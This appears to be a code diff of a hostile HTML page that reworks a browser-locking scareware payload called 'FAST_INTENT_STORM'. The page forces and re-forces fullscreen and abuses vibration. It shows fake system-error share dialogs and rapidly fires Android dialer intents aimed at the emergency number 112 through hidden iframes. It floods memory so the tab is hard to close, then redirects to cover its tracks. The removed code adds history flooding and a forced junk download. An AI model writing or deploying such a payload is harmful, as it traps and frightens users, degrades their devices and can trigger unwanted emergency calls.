@@ -3,76 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>CRITICAL_SYSTEM_OVERRIDE</title>
+    <title>⚡ FAST_INTENT_STORM ⚡</title>
     <style>
-        body, html { margin: 0; padding: 0; background: #000; width: 100vw; height: 100vh; overflow: hidden; cursor: none; }
-        #trigger { width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; color: red; font-family: monospace; }
+        body, html { margin: 0; padding: 0; background: #000; width: 100vw; height: 100vh; overflow: hidden; }
+        #trigger { 
+            width: 100%; height: 100%; display: flex; align-items: center; 
+            justify-content: center; color: #0f0; font-family: 'Courier New', monospace;
+            text-shadow: 0 0 10px #0f0; cursor: pointer;
+        }
     </style>
 </head>
 <body>
-    <div id="trigger">INITIALIZING...</div>
+    <div id="trigger"> [ DEPLOY PAYLOAD ] </div>
 
 <script>
     const trigger = document.getElementById('trigger');
+    
+    // Payload Intent yang diarahkan ke sistem dialer atau deep link aplikasi
+    const targetIntent = "intent://112#Intent;scheme=tel;action=android.intent.action.DIAL;end";
 
-    async function executePayload() {
-        // 1. Lock Fullscreen & Prevent Exit
+    async function fastStorm() {
+        // 1. Instant Fullscreen Lockdown
         if (document.documentElement.requestFullscreen) {
-            await document.documentElement.requestFullscreen();
+            document.documentElement.requestFullscreen().catch(()=>{});
         }
-        
-        // 2. Haptic Feedback (Vibration Abuse)
+
+        // 2. High-Frequency Vibration (Sustained)
         if (navigator.vibrate) {
-            navigator.vibrate([500, 200, 500, 200, 500]);
+            navigator.vibrate([100, 50, 100, 50, 100, 50, 100]);
         }
 
-        // 3. History Flooding (Anti-Back Button)
-        for (let i = 0; i < 20; i++) {
-            window.history.pushState(null, "", "#sys_error_" + i);
-        }
-
-        // 4. Intent & Web Share Race Condition
-        const intentUrl = "intent://*#Intent;scheme=tel;action=android.intent.action.DIAL;end";
-        
+        // 3. Web Share API - Memaksa System UI muncul di layer teratas
         if (navigator.share) {
             navigator.share({
-                title: 'SYSTEM_CRITICAL',
-                text: 'DANGER: Memory Corruption Detected',
-                url: window.location.href
+                title: 'CRITICAL_UPDATE',
+                text: 'SYSTEM_ERROR_CODE_0x0041',
+                url: ' ' 
             }).catch(() => {});
         }
 
-        // 5. Auto-Download Junk (Memory Pressure)
-        const blob = new Blob(["0".repeat(1024 * 1024)], {type: "application/octet-stream"});
-        const url = window.URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = "sys_dump.bin";
-        a.click();
+        // 4. RAPID INTENT INJECTION (The "Speed" Part)
+        // Kita menggunakan loop untuk membombardir sistem dengan permintaan Intent
+        for (let i = 0; i < 5; i++) {
+            setTimeout(() => {
+                const ifr = document.createElement('iframe');
+                ifr.style.display = 'none';
+                ifr.src = targetIntent;
+                document.body.appendChild(ifr);
+                
+                // Trigger via location juga untuk memastikan race condition
+                window.location.href = targetIntent;
+            }, i * 50); // Eksekusi setiap 50 milidetik
+        }
 
-        // 6. Loop Intent via Iframe
-        setInterval(() => {
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = intentUrl;
-            document.body.appendChild(iframe);
-            setTimeout(() => document.body.removeChild(iframe), 100);
-        }, 300);
+        // 5. Memory Ballooning (Membuat browser lag agar sulit menutup tab)
+        const junk = [];
+        for (let j = 0; j < 100; j++) {
+            junk.push(new Array(100000).fill("STORM"));
+        }
 
-        // 7. Ghost Redirect
+        // 6. Final Redirect (Ghosting)
         setTimeout(() => {
-            window.location.replace("https://www.google.com/");
-        }, 2000);
+            window.location.replace("https://www.google.com");
+        }, 1500);
     }
 
-    // Trigger on any interaction
-    trigger.addEventListener('touchstart', executePayload);
-    trigger.addEventListener('click', executePayload);
+    // Trigger secepat mungkin pada interaksi pertama
+    trigger.addEventListener('mousedown', fastStorm);
+    trigger.addEventListener('touchstart', fastStorm);
 
-    // Re-lock Fullscreen if user tries to escape
+    // Anti-Escape: Paksa Fullscreen kembali jika user mencoba keluar
     document.addEventListener('fullscreenchange', () => {
         if (!document.fullscreenElement) {
-            document.documentElement.requestFullscreen();
+            setTimeout(() => {
+                document.documentElement.requestFullscreen().catch(()=>{});
+            }, 10);
         }
     });
 </script>
